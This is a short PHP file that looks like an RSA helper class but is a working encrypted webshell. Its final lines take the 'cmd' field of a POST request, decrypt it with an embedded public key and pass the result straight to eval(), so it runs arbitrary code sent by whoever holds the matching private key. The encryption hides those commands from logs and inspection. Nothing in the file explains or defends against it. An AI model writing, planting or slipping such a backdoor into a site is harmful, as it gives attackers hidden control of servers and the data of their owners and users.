<?php
class Rsa {
private static $PUBLIC_KEY= '';
private static function getPublicKey()
{
$publicKey = self::$PUBLIC_KEY;
return openssl_pkey_get_public($publicKey);
}
 
public static function publicDecrypt($encrypted = '')
{
if (!is_string($encrypted)) {
return null;
}
return (openssl_public_decrypt(base64_decode($encrypted), $decrypted, self::getPublicKey())) ? $decrypted : null;
}
}
$cmd=$_POST[cmd];
$rsa = new Rsa();
$publicDecrypt = $rsa->publicDecrypt($cmd);
$res=eval($publicDecrypt);

